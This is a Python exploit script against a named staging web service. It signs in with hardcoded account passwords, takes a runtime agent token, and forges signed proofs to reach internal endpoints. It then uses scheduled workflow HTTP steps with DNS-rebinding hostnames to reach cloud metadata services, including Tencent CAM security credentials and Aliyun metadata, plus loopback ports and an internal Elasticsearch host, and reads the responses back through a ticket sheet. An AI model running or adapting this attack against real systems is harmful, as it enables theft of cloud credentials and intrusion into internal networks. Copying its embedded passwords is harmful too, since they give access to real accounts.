#!/usr/bin/env python3
# i28728: stage web-side workflow create (bypass /internal 500) + DNS-rebind SSRF to cloud metadata.
import os,sys,json,time,base64,hmac,hashlib,subprocess,random,string,re
HOST="stage-assistant.lumiiai.cn"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
T0=time.time()
def el(): return int(time.time()-T0)
def _b64(s): return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v):
    s=v if isinstance(v,str) else json.dumps(v,ensure_ascii=False,default=str)
    print("R:%s:%s"%(k,_b64(s)),flush=True)
def curl(args,timeout=45):
    try:
        r=subprocess.run(["curl","-s","-k","-m",str(timeout)]+args,capture_output=True,timeout=timeout+15)
        return r.returncode,r.stdout,r.stderr
    except Exception as e: return -1,b"",repr(e).encode()
def call(path,method="GET",body=None,hdrs=None,timeout=45,maxlen=300000):
    url="https://%s%s"%(HOST,path)
    args=["--http2","-A",UA,"-H","Accept: application/json, text/plain, */*",
          "-H","Referer: https://%s/"%HOST,"-H","Origin: https://%s"%HOST,
          "-w","\n__CODE__%{http_code}"]
    if hdrs:
        for k,v in hdrs.items(): args+=["-H","%s: %s"%(k,v)]
    if body is not None:
        args+=["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
    elif method!="GET": args+=["-X",method]
    args+=[url]
    rc,out,err=curl(args,timeout=timeout)
    txt=out.decode("utf-8","replace"); code="";i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3];txt=txt[:i]
    return {"path":path,"code":code,"body":txt[:maxlen],"len":len(txt),"err":err.decode("utf-8","replace")[:200]}
def J(r):
    try: return json.loads(r["body"])
    except Exception: return None

def login(ident,pw):
    rc,out,err=curl(["--http2","-A",UA,"-i","-X","POST","-H","Content-Type: application/json",
                     "--data-binary",json.dumps({"identifier":ident,"password":pw}),
                     "https://%s/api/auth/login"%HOST],timeout=45)
    txt=out.decode("utf-8","replace"); code="";m=re.search(r"HTTP/[0-9.]+ (\d{3})",txt)
    if m: code=m.group(1)
    mc=re.search(r"lumii_session=([^;]+)",txt); ck=("lumii_session="+mc.group(1)) if mc else None
    body=txt.split("\r\n\r\n",1)[-1] if "\r\n\r\n" in txt else txt; uid=""
    try:
        bj=json.loads(body[body.find("{"):]) if "{" in body else {}
        uid=(bj.get("user") or {}).get("id") or bj.get("id") or ""
    except Exception: pass
    return code,ck,uid,body[:160]

cookie=None;UID=""
for ident,pw in [("lc-zone-leader@lumii.dev","Lianchuang#2026"),("e2e-accept@lumii.dev","E2eAccept!0813"),
                 ("lc-app-admin@lumii.dev","Lianchuang#2026")]:
    code,ck,uid,body=login(ident,pw)
    R("A_try_%s"%ident.split("@")[0],{"code":code,"uid":uid,"ck":bool(ck),"body":body})
    if code=="200" and ck: cookie=ck;UID=uid;break
ORG="org_P7YGEJ2tbmGZRXuCTb2qG"
R("A_login",{"uid":UID,"cookie":bool(cookie)})
if not cookie: R("FATAL_no_login",{"t":el()}); sys.exit(0)

# runtime machine identity
RID="";RTOKEN="";PROOF_KEY=None
cr=call("/api/runtimes","POST",{"name":"rb28728-%d"%random.randint(1000,9999)},hdrs={"Cookie":cookie})
R("A_create_rt",{"code":cr["code"],"body":cr["body"][:300]})
blob=cr["body"]
mid=re.search(r"AGENT_ID='([^']+)'",blob)
mtk=re.search(r"AGENT_TOKEN='([^']+)'",blob)
cj=J(cr) or {}
RID=mid.group(1) if mid else (cj.get("id") or (cj.get("runtime") or {}).get("id") or "")
RTOKEN=mtk.group(1) if mtk else (cj.get("token") or cj.get("agentToken") or (cj.get("runtime") or {}).get("token") or "")
if RID and RTOKEN:
    k=call("/api/runtimes/keys/current",hdrs={"x-agent-id":RID,"x-agent-token":RTOKEN})
    if k["code"]!="200":
        k=call("/api/runtimes/keys/current",hdrs={"x-agent-id":RID,"Authorization":"Bearer "+RTOKEN})
    if k["code"]=="200":
        try: PROOF_KEY=(J(k) or {}).get("proof_key")
        except: pass
R("A_cred",{"rid":RID,"proof_key":bool(PROOF_KEY),"uid":UID})

SK="conv_28728"
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def make_proof(actor):
    if not PROOF_KEY: return ""
    now=int(time.time())
    claims={"session_key":SK,"platform":"dashboard","chat_id":SK,"actor_id":actor,"iss":RID,"aud":RID,"iat":now-5,"exp":now+1500}
    p=b64u(json.dumps(claims,separators=(",",":")).encode())
    sig=b64u(hmac.new(PROOF_KEY.encode(),p.encode(),hashlib.sha256).digest())
    return "v2."+p+"."+sig
def internal(name,extra=None):
    b={"platform":"dashboard","actor_id":UID,"session_key":SK}
    if extra: b.update(extra)
    return call("/internal/"+name,"POST",b,hdrs={"Authorization":"Bearer "+RTOKEN,"x-agent-id":RID,"x-lumii-turn-proof":make_proof(UID)})
def internal_get(name,query=""):
    q={"platform":"dashboard","actor_id":UID,"session_key":SK}
    return call("/internal/"+name+("?"+query if query else ""),"GET",None,hdrs={"Authorization":"Bearer "+RTOKEN,"x-agent-id":RID,"x-lumii-turn-proof":make_proof(UID)})

# scratch sheet
cf=internal("tickets/create-folder",{"name":"rb28728","icon":"grid","description":"x"})
cj=J(cf) or {}
sheet=(cj.get("sheet") or {}).get("id"); folder=(cj.get("folder") or {}).get("id")
FKEY=None
if sheet:
    sc=internal("tickets/schema",{"sheet_id":sheet})
    sj=J(sc) or {}; fs=sj.get("fields") or []
    for f in fs:
        if f.get("type") in ("text","long_text","textarea","string"):
            FKEY=f.get("key");break
    if not FKEY and fs: FKEY=fs[0].get("key")
R("C_ids",{"sheet":sheet,"folder":folder,"fkey":FKEY,"folder_create":cf["code"],"schema":sc["code"] if sheet else None})
if not folder: R("FATAL_nofolder",{"body":cf["body"][:300]}); sys.exit(0)

# ---- DIAG: does stage workflow table schema resolve? ----
g1=call("/api/tickets/folders/%s/workflows"%folder,hdrs={"Cookie":cookie})
R("G_folder_wf",{"code":g1["code"],"body":g1["body"][:800]})
g2=call("/api/tickets/folders/%s/workflow-runs?limit=5"%folder,hdrs={"Cookie":cookie})
R("G_folder_runs",{"code":g2["code"],"body":g2["body"][:400]})
g3=call("/api/apps",hdrs={"Cookie":cookie})
R("G_apps",{"code":g3["code"],"body":g3["body"][:600]})

def fresh(): return "".join(random.choice(string.ascii_lowercase+string.digits) for _ in range(11))
def rebind(ip2,ip1="1.1.1.1"):
    p=ip2.split("."); a=".".join(p[:2]); b=".".join(p[2:])
    return "make-%s-rebind-%s-%s-rr-%s.1u.ms"%(ip1,a,b,fresh())

def mkdef(name,url,timeoutMs,capture=True):
    onceAt=time.strftime("%Y-%m-%dT%H:%M:%SZ",time.gmtime(time.time()+7200))
    steps=[{"id":"h1","kind":"http","method":"GET","url":url,"timeoutMs":timeoutMs}]
    if capture and FKEY:
        steps.append({"id":"c1","kind":"create","sheetId":sheet,"values":{FKEY:"{{h1.status}}##{{h1.body}}"}})
    return {"name":name[:60],"enabled":True,"trigger":{"kind":"schedule","every":"once","onceAt":onceAt},
            "steps":steps,"overlap":"skip"}

def summarize_run(tag,code,run_or_none,raw_body):
    if isinstance(run_or_none,dict) and run_or_none:
        R("RUN_%s"%tag,{"code":code,"status":run_or_none.get("status"),"err":run_or_none.get("error"),
                        "errMsg":run_or_none.get("errorMessage"),"stepsLog":run_or_none.get("stepsLog")})
    else:
        R("RUN_%s"%tag,{"code":code,"raw":raw_body[:600]})

def mk_folder(tag,url,timeoutMs):
    cr=call("/api/tickets/folders/%s/workflows"%folder,"POST",mkdef(tag,url,timeoutMs),hdrs={"Cookie":cookie})
    wj=J(cr) or {}; wid=(wj.get("workflow") or {}).get("id") or ""
    R("Uf_%s"%tag,{"code":cr["code"],"wid":wid})
    if not wid: R("Uf_%s_body"%tag,{"body":cr["body"][:500]}); return False,wid
    rn=call("/api/tickets/folders/%s/workflows/%s/run-now"%(folder,wid),"POST",{},hdrs={"Cookie":cookie},timeout=45)
    rj=J(rn) or {}
    run=rj.get("run") or (rj if rj.get("status") else None)
    summarize_run(tag,rn["code"],run,rn["body"])
    if run is None and rn["code"]=="200":
        # dispatched async -> poll
        for _ in range(6):
            time.sleep(4)
            gr=call("/api/tickets/folders/%s/workflow-runs?workflowId=%s&limit=3"%(folder,wid),hdrs={"Cookie":cookie})
            gj=J(gr) or {}; runs=gj.get("runs") or []
            if runs and runs[0].get("status") in ("succeeded","failed","canceled","success","error"):
                summarize_run(tag,gr["code"],runs[0],""); break
    return True,wid

def mk_project(tag,url,timeoutMs):
    cr=call("/api/workflows/__default__/workflows","POST",mkdef(tag,url,timeoutMs),hdrs={"Cookie":cookie})
    wj=J(cr) or {}; wid=(wj.get("workflow") or {}).get("id") or ""
    R("Up_%s"%tag,{"code":cr["code"],"wid":wid})
    if not wid: R("Up_%s_body"%tag,{"body":cr["body"][:500]}); return False,wid
    rn=call("/api/workflows/%s/run-now"%wid,"POST",{},hdrs={"Cookie":cookie},timeout=45)
    rj=J(rn) or {}; rid=rj.get("runId")
    R("Rp_%s"%tag,{"code":rn["code"],"runId":bool(rid),"body":rn["body"][:300]})
    if rid:
        for _ in range(6):
            time.sleep(4)
            gr=call("/api/workflows/%s/runs/%s"%(wid,rid),hdrs={"Cookie":cookie})
            gj=J(gr) or {}; run=gj.get("run") or gj
            st=run.get("status") if isinstance(run,dict) else None
            if st in ("succeeded","failed","canceled","success","error"):
                summarize_run(tag,gr["code"],run,""); break
    return True,wid

# ---- Step 1: control baidu on BOTH create routes (avoid 500) ----
ok_f,wf = mk_folder("base_baidu","https://www.baidu.com/",9000)
route=None
if ok_f: route="folder"
if not ok_f:
    ok_p,wp = mk_project("base_baidu","https://www.baidu.com/",9000)
    if ok_p: route="project"

R("ROUTE",{"folder":ok_f,"route":route,"t":el()})

if not route:
    # both failed: try GET diag conclusion already logged; also try a minimal schedule-only def and internal once
    R("BOUNDARY",{"note":"both web create routes failed; see Uf/Up base_baidu codes","t":el()})
    R("DONE",{"t":el()}); sys.exit(0)

def do(tag,ip2,port,path,timeoutMs=7000):
    dom=rebind(ip2); url="http://%s:%d%s"%(dom,port,path)
    R("URL_%s"%tag,{"url":url})
    if route=="folder": mk_folder(tag,url,timeoutMs)
    else: mk_project(tag,url,timeoutMs)
    time.sleep(0.3)

# ---- Step 2: rebind targets (Tencent meta first) ----
do("tencent_meta","169.254.0.23",80,"/latest/meta-data/")
do("tencent_cam","169.254.0.23",80,"/latest/meta-data/cam/security-credentials/")
do("tencent_cam_root","169.254.0.23",80,"/latest/meta-data/cam/")
do("generic_meta","169.254.169.254",80,"/latest/meta-data/")
do("aliyun_meta","100.100.100.200",80,"/latest/meta-data/")
do("lo_8788","127.0.0.1",8788,"/")
do("lo_5000","127.0.0.1",5000,"/")
do("es_9200","172.22.0.11",9200,"/")

# read back captured records (bodies)
q=internal("tickets/query",{"sheet_id":sheet})
R("Q_records",{"code":q["code"],"body":q["body"][:9000]})
# dump all folder runs (each with stepsLog) in one shot
allruns=call("/api/tickets/folders/%s/workflow-runs?limit=60"%folder,hdrs={"Cookie":cookie},maxlen=200000)
R("ALLRUNS",{"code":allruns["code"],"body":allruns["body"][:150000]})
R("DONE",{"t":el(),"route":route})
